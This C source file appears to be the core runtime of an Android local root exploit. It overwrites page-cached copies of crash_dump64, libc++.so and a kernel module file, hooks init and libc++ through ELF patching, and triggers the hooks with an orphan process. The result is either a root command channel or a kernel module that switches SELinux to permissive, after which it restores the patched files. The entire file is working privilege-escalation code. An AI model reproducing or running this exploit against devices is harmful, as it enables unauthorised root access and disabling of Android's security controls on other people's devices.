#include "root_runtime.h"

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/system_properties.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#include "elf_hook.h"
#include "file_ops.h"
#include "payloads.h"
#include "target_registry.h"

static const char crash_dump_path[] =
    "/apex/com.android.runtime/bin/crash_dump64";

struct CacheIdentity {
    const char *path;
    off_t size;
    uint8_t sha256[32];
    int valid;
    int touched;
};

static int capture_cache_identity(const char *path,
                                  struct CacheIdentity *identity,
                                  struct Reporter *reporter) {
    memset(identity, 0, sizeof(*identity));
    identity->path = path;
    struct stat file_stat;
    if (stat(path, &file_stat) != 0
            || hash_file(path, identity->sha256) != 0) {
        REPORTLN("cache identity unavailable: %s (%s)",
                 path, strerror(errno));
        return -1;
    }
    identity->size = file_stat.st_size;
    identity->valid = 1;
    REPORTLN("cache identity captured: %s size=%lld sha256=recorded",
             path, (long long)identity->size);
    return 0;
}

static int verify_cache_identity(const struct CacheIdentity *identity,
                                 struct Reporter *reporter) {
    struct stat file_stat;
    uint8_t observed[32];
    int exact = identity->valid
        && stat(identity->path, &file_stat) == 0
        && file_stat.st_size == identity->size
        && hash_file(identity->path, observed) == 0
        && memcmp(observed, identity->sha256, sizeof(observed)) == 0;
    REPORTLN("cache restoration: path=%s state=%s",
             identity->path,
             exact ? "restored_exact" : "failed_or_ambiguous");
    return exact ? 0 : -1;
}

static int capture_protected_cache_identity(
        struct DirtyFragWriter *writer, struct CacheIdentity *identity,
        struct Reporter *reporter) {
    memset(identity, 0, sizeof(*identity));
    identity->path = writer->protected_path;
    if (dirtyfrag_identity_protected(writer, &identity->size,
                                     identity->sha256, reporter) != 0) {
        REPORTLN("protected cache identity unavailable: %s",
                 writer->protected_path);
        return -1;
    }
    identity->valid = 1;
    REPORTLN("protected cache identity captured: %s size=%lld sha256=recorded",
             identity->path, (long long)identity->size);
    return 0;
}

static int verify_protected_cache_identity(
        struct DirtyFragWriter *writer, const struct CacheIdentity *identity,
        struct Reporter *reporter) {
    off_t observed_size = -1;
    uint8_t observed_sha256[32];
    int exact = identity->valid
        && dirtyfrag_identity_protected(writer, &observed_size,
                                        observed_sha256, reporter) == 0
        && observed_size == identity->size
        && memcmp(observed_sha256, identity->sha256,
                  sizeof(observed_sha256)) == 0;
    REPORTLN("protected cache restoration: path=%s state=%s",
             identity->path,
             exact ? "restored_exact" : "failed_or_ambiguous");
    return exact ? 0 : -1;
}

static int verify_file_prefix(const char *path, const void *expected,
                              size_t length, struct Reporter *reporter) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    int exact = fd >= 0 && file_span_matches(fd, 0, expected, length);
    if (fd >= 0) close(fd);
    REPORTLN("cache patch readback: path=%s state=%s",
             path, exact ? "exact" : "mismatch");
    return exact ? 0 : -1;
}

static int create_orphan_process(struct Reporter *reporter) {
    int pid = fork();
    if (pid < 0) {
        REPORTLN("orphan trigger fork failed");
        return -1;
    }
    if (pid == 0) {
        int child = fork();
        if (child == 0) {
            sleep(1);
            _exit(0);
        }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static int patch_module_payload(struct DirtyFragWriter *writer,
                                struct CacheIdentity *bridge,
                                struct CacheIdentity *carrier,
                                const struct KoImage **selected_image,
                                struct Reporter *reporter) {
    const struct KoImage *image = select_runtime_ko_image();
    if (!image) {
        REPORTLN("module target rejected: no exact runtime image");
        return 1;
    }
    *selected_image = image;
    REPORTLN("module image: %s (%d bytes)", image->id,
             (int)(image->end - image->start));
    if (capture_cache_identity(writer->bridge_path, bridge, reporter) != 0)
        return -1;

    size_t helper_length;
    char *helper = pad16(splice_helper_start,
                         (size_t)(splice_helper_end - splice_helper_start),
                         &helper_length);
    if (!helper) return -1;
    REPORTLN("* module bridge patch (%zu bytes)", helper_length);
    bridge->touched = 1;
    int result = dirtyfrag_patch_file(writer, writer->bridge_path,
                                      helper, helper_length, 0, 0, reporter);
    if (result == 0)
        result = verify_file_prefix(writer->bridge_path, helper,
                                    helper_length, reporter);
    free(helper);
    if (result != 0) return result;

    if (capture_protected_cache_identity(writer, carrier, reporter) != 0)
        return -1;

    size_t module_length;
    char *module = pad16(image->start, (size_t)(image->end - image->start),
                         &module_length);
    if (!module) return -1;
    REPORTLN("* module carrier patch: %s (%zu bytes)",
             writer->protected_path, module_length);
    carrier->touched = 1;
    result = dirtyfrag_patch_file(writer, writer->protected_path,
                                  module, module_length, 0, 1, reporter);
    free(module);
    return result;
}

struct ResultMarker {
    const char *path;
    const char *message;
    int result;
};

static int marker_exists(const char *path) {
    return access(path, F_OK) == 0;
}

static int wait_for_init_shell(struct Reporter *reporter, int timeout_ms) {
    static const struct ResultMarker failures[] = {
        {"/dev/dfE", "shell SELinux transition failed", 1},
        {"/dev/dfG", "shell group transition failed", 1},
        {"/dev/dfX", "root command script exec failed", 1},
    };
    int stage_reported = 0;
    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 20) {
        usleep(20000);
        char ready[PROP_VALUE_MAX] = {0};
        if (__system_property_get("debug.dfroot.ready", ready) > 0
                && strcmp(ready, "1") == 0) {
            REPORTLN("root command channel ready: /data/local/tmp/dfroot-command");
            REPORTLN("***SUCCESS***");
            return 0;
        }
        char error[PROP_VALUE_MAX] = {0};
        if (__system_property_get("debug.dfroot.error", error) > 0
                && error[0] != '\0') {
            REPORTLN("init shell failed: setup stage=%s", error);
            return 1;
        }
        if (!stage_reported && marker_exists("/dev/dfR")) {
            REPORTLN("init child prepared embedded command");
            stage_reported = 1;
        }
        for (size_t i = 0; i < sizeof(failures) / sizeof(failures[0]); i++) {
            if (marker_exists(failures[i].path)) {
                REPORTLN("init shell failed: %s", failures[i].message);
                return failures[i].result;
            }
        }
    }
    REPORTLN("init shell failed: command channel timed out");
    return 2;
}

static int wait_for_module_result(struct Reporter *reporter, int timeout_ms) {
    static const struct ResultMarker markers[] = {
        {"/dev/df", "libc++: mutex acquired, loading custom module", -1},
        {"/dev/dfm0", "***SUCCESS***", 0},
        {"/dev/dfm1", "***FAILED***: ksud exited with error", 1},
    };
    int seen[sizeof(markers) / sizeof(markers[0])] = {0};
    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 10) {
        usleep(10000);
        for (size_t i = 0; i < sizeof(markers) / sizeof(markers[0]); i++) {
            if (seen[i] || !marker_exists(markers[i].path)) continue;
            seen[i] = 1;
            REPORTLN("%s", markers[i].message);
            if (markers[i].result >= 0) return markers[i].result;
        }
    }
    REPORTLN("***FAILED***: check logs");
    return 2;
}

static int wait_for_selinux_permissive(struct Reporter *reporter,
                                       int timeout_ms) {
    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 20) {
        int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        char value = 0;
        int permissive = fd >= 0 && read(fd, &value, 1) == 1 && value == '0';
        if (fd >= 0) close(fd);
        if (permissive) {
            REPORTLN("SELinux state after exact module: permissive");
            return 0;
        }
        usleep(20000);
    }
    REPORTLN("exact module failed: SELinux did not become permissive");
    return 2;
}

int run_init_strategy(struct DirtyFragWriter *writer,
                      const struct InitTarget *target,
                      struct Reporter *reporter) {
    struct PatchRestore restore = {0};
    int result = 3;
    if (!target) {
        REPORTLN("init strategy blocked: no exact target");
        return result;
    }
    if (marker_exists("/dev/dfs")) {
        REPORTLN("init strategy blocked: /dev/dfs already exists in the app mount namespace");
        REPORTLN("next step: reboot once to clear the one-shot init state, then run again");
        return 2;
    }
    dirtyfrag_writer_set_paths(writer, crash_dump_path, target->carrier_path);
    REPORTLN("init target=%s carrier=%s payload=%u",
             target->id, target->carrier_path, init_shell_len);
    if (install_elf_hook(writer, target->carrier_path, target->hook_symbol,
                         init_shell_data, init_shell_len, init_shell_start,
                         init_shell_first_inst_copy, reporter, &restore) != 0)
        goto cleanup;
    usleep(500000);
    REPORTLN("* triggering init child...");
    if (create_orphan_process(reporter) != 0) goto cleanup;
    result = wait_for_init_shell(reporter, 30000);

cleanup:
    REPORTLN("\n=== cleanup ===");
    if (restore_elf_hook(writer, &restore, reporter) != 0) result = 3;
    dispose_elf_hook(&restore);
    return result;
}

int run_module_strategy(struct DirtyFragWriter *writer,
                        const char *ko_target, int soft_reboot,
                        struct Reporter *reporter) {
    dirtyfrag_writer_set_paths(writer, crash_dump_path, ko_target);
    char *embedded_target = libcxx_data + libcxx_ko_target_off;
    strncpy(embedded_target, ko_target, 63);
    embedded_target[63] = '\0';
    uint8_t *embedded_soft_reboot =
        (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
    *embedded_soft_reboot = soft_reboot ? 1 : 0;

    struct PatchRestore restore = {0};
    struct CacheIdentity bridge = {0};
    struct CacheIdentity carrier = {0};
    const struct KoImage *image = NULL;
    int result = 3;
    if (patch_module_payload(writer, &bridge, &carrier,
                             &image, reporter) != 0)
        goto cleanup;
    if (install_elf_hook(writer, "/system/lib64/libc++.so",
            "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
            libcxx_data, libcxx_len, libcxx_start,
            libcxx_first_inst_copy, reporter, &restore) != 0)
        goto cleanup;

    usleep(500000);
    REPORTLN("* triggering module loader...");
    if (create_orphan_process(reporter) != 0) goto cleanup;
    result = image->completion == KO_MAKES_SELINUX_PERMISSIVE
        ? wait_for_selinux_permissive(reporter, 5000)
        : wait_for_module_result(reporter, 5000);

cleanup:
    if (result == 3) REPORTLN("***FAILED***: failed to patch files");
    REPORTLN("\n=== cleanup ===");
    int cleanup_failed = restore_elf_hook(writer, &restore, reporter) != 0;
    if (carrier.touched) {
        if (dirtyfrag_drop_protected_cache(writer, reporter) != 0
                || verify_protected_cache_identity(writer,
                                                   &carrier, reporter) != 0)
            cleanup_failed = 1;
    }
    if (bridge.touched) {
        if (drop_file_cache(crash_dump_path, reporter) != 0
                || verify_cache_identity(&bridge, reporter) != 0)
            cleanup_failed = 1;
    }
    if (cleanup_failed) {
        REPORTLN("cleanup incomplete: one or more patched files are unverified");
        result = 3;
    }
    dispose_elf_hook(&restore);
    if (result == 0 && image
            && image->completion == KO_MAKES_SELINUX_PERMISSIVE) {
        REPORTLN("\n=== composed init shell ===");
        const struct InitTarget *target = find_init_target(reporter);
        if (!target) {
            REPORTLN("composed strategy blocked: exact init target disappeared");
            return 3;
        }
        return run_init_strategy(writer, target, reporter);
    }
    return result;
}
